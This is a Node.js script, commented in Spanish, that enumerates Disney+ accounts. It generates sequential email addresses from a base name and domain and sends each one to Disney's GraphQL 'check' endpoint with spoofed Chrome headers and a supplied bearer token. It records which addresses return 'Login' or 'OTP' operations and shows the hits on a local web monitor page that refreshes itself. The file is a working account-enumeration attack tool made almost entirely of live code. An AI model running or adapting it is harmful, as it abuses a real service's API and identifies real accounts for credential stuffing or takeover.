import fs from "fs";
import express from "express";
import readline from "readline";

const app = express();

// --- CAPTURA DE PARÁMETROS ---
const basedisney = process.argv[2] || "disney";
const inicio = parseInt(process.argv[3]) || 1;
const fin = parseInt(process.argv[4]) || 100000;
const dominio = process.argv[5] || "@ttvgt.com";
const PUERTO = parseInt(process.argv[6]) || 3000;
const TOKEN = process.argv[7];

// --- VARIABLES DE ESTADO ---
let i = inicio;
let NF = "";
let ultimoError = null;
let detenido = false;
let encontrados = []; // Array para guardar los que sí existen

// --- SERVIDOR DE ESTADO (MONITOR WEB) ---
app.get('/', (req, res) => {
    const progreso = (((i - inicio) / (fin - inicio)) * 100).toFixed(2);
    const statusColor = detenido ? "#ff4d4d" : "#4CAF50";
    const statusText = detenido ? "🛑 PROCESO DETENIDO" : "⚙️ MINANDO...";

    // Generar HTML de la lista de encontrados
    const listaHtml = encontrados.length > 0
        ? encontrados.map(email => `<li style="color: #2e7d32; font-weight: bold;">⭐ ${email}</li>`).join('')
        : '<li>Ninguno aún...</li>';

    res.send(`
        <html>
            <head><title>Monitor Disney</title></head>
            <body style="font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f9;">
                <h1 style="color: ${statusColor};">${statusText}</h1>
                <p style="font-size: 1.2em;">Probando: <strong>${basedisney}${NF}${dominio}</strong></p>
                
                <div style="width: 80%; background: #eee; margin: 10px auto; border-radius: 10px; height: 30px; border: 1px solid #ccc;">
                    <div style="width: ${progreso}%; background: ${statusColor}; color: white; padding: 5px 0; border-radius: 10px; height: 20px; transition: width 0.5s;">
                        ${progreso}%
                    </div>
                </div>
                
                <div style="display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top: 20px;">
                    <div style="background: white; padding: 20px; border-radius: 10px; border: 1px solid #ccc; min-width: 300px;">
                        <h3>Estado Actual</h3>
                        <p>Actual: <strong>${NF}</strong></p>
                        <p>Rango: ${inicio} - ${fin}</p>
                        ${ultimoError ? `<p style="color: red; background: #fee; padding: 10px;">⚠️ <strong>Error:</strong> ${ultimoError}</p>` : ''}
                    </div>

                    <div style="background: white; padding: 20px; border-radius: 10px; border: 1px solid #ccc; min-width: 300px; text-align: left;">
                        <h3 style="text-align: center;">⭐ Encontrados (Últimos 10)</h3>
                        <ul style="list-style: none; padding: 0;">
                            ${listaHtml}
                        </ul>
                    </div>
                </div>

                <script>
                    if (!${detenido}) {
                        setTimeout(() => location.reload(), 3000);
                    }
                </script>
            </body>
        </html>
    `);
});

app.listen(PUERTO, () => {
    console.log(`\n✅ Monitor web listo en: http://localhost:${PUERTO}`);
});

// --- BUCLE PRINCIPAL ---
async function main() {
    console.log("NUEVA VERSION 22229")
    console.log(`\n🚀 Iniciando minado: ${basedisney} del ${inicio} al ${fin}`);

    for (i = inicio; i <= fin; i++) {


        var CL = 0
        var numberL = ("" + i).length;
        NF=i
        if(CL>0 && CL - numberL >= 0){
            var ceros = CL - numberL;
            NF = "0".repeat(ceros) + i
        }
        


        const correoFormado = `${basedisney}${NF}${dominio}`.trim();
       // console.log(correoFormado)

        const result = await checkDisneyExists(correoFormado);

        // Feedback en consola
        if (process.stdout.isTTY) {
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`Trabajando: ${i} / ${fin} [Encontrados: ${encontrados.length}]`);
        }

        if (!result.noError) {
            ultimoError = result.errorMessage;
            detenido = true;
            console.error(`\n\n❌ DETENIDO en i = ${i} por error. ` + ultimoError);
            break;
        }

        if (result.exist) {
            console.log(`\n⭐ ENCONTRADO: ${correoFormado}`);
            // Añadir al principio del array y mantener solo los últimos 10
            encontrados.unshift(correoFormado);
            if (encontrados.length > 10) encontrados.pop();
        }
    }
}

main();

// --- FUNCIÓN FETCH ---
async function checkDisneyExists(email) {
    let result = { noError: false, exist: null, serverError: false, errorMessage: "" };
    try {
        const serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/",
                "authorization": TOKEN,
            },
            "body": JSON.stringify({
                query: "\n    query check($email: String!) {\n        check(email: $email) {\n            operations\n        }\n    }\n",
                variables: { email: email },
                operationName: "check"
            }),
            "method": "POST"
        });

        if (!serverResponse.ok) throw new Error(`HTTP ${serverResponse.status}`);

        const jsonResponse = await serverResponse.json();
        if (jsonResponse.errors) throw new Error(jsonResponse.errors[0].code);

        if (jsonResponse.data && jsonResponse.data.check) {
            const ops = jsonResponse.data.check.operations;
            result.exist = ops.includes("Login") || ops.includes("OTP");
            result.noError = true;
        }
    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    }
    return result;
}